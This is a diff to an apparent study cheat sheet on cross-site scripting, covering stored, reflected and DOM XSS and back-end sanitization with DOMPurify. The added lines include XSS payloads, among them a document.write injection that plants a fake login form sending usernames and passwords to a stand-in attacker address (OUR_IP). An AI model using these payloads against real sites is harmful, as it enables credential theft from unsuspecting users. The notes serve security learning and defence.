@@ -1,7 +1,8 @@
-## <img src="https://hackmd.io/_uploads/rJ_vxRola.png" width=60> <img src="https://hackmd.io/_uploads/rJSKT6ie6.png" width=60> [<span style=color:darkred>**Vulnerability Details**</span>](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#vulnerability-details)
 
-### <span style=color:darkred>Persistent</span>
-### <span style=color:red>Stored</span>
+[![hackmd-github-sync-badge](https://hackmd.io/qK4OEeKlSUuvmWVzvrKJ2Q/badge)](https://hackmd.io/qK4OEeKlSUuvmWVzvrKJ2Q)
+## [<span style=color:darkred>**Vulnerability Details**</span>](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#vulnerability-details)
+
+### <span style=color:red>Stored (Persistent) XSS</span>
 #### Payload
 ```javascript!
 <script>alert(window.origin)</script>
@@ -14,13 +15,18 @@
 ```
 
 ### <span style=color:darkred>Non-Persistent</span>
-```javascript
-// Must employ Social Engineer and specific URL to lure victim click
-```
+``Must employ Social Engineer and specific URL to lure victim click``
 ### <span style=color:red>Reflected XSS</span>
 #### Payload
 ```javascript
 http://SERVER_IP:PORT/index.php?task=<script>alert(window.origin)</script>
+```
+```javascript
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+```
+
+```javascript
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
 ```
 
 ### <span style=color:red>DOM (Document Object Model) XSS</span>
@@ -46,4 +52,14 @@ let clean = DOMPurify.sanitize( dirty );
 }
 ```
 
-### <span style=color:darkblue>From-End</span>
+### <span style=color:darkblue>Back-End</span>
+#### Input validation
+``
+For a NodeJS back-end, we can use the same JavaScript code mentioned earlier for the front-end.
+``
+
+#### Input Sanitization
+```javascript
+import DOMPurify from 'dompurify';
+var clean = DOMPurify.sanitize(dirty);
+```
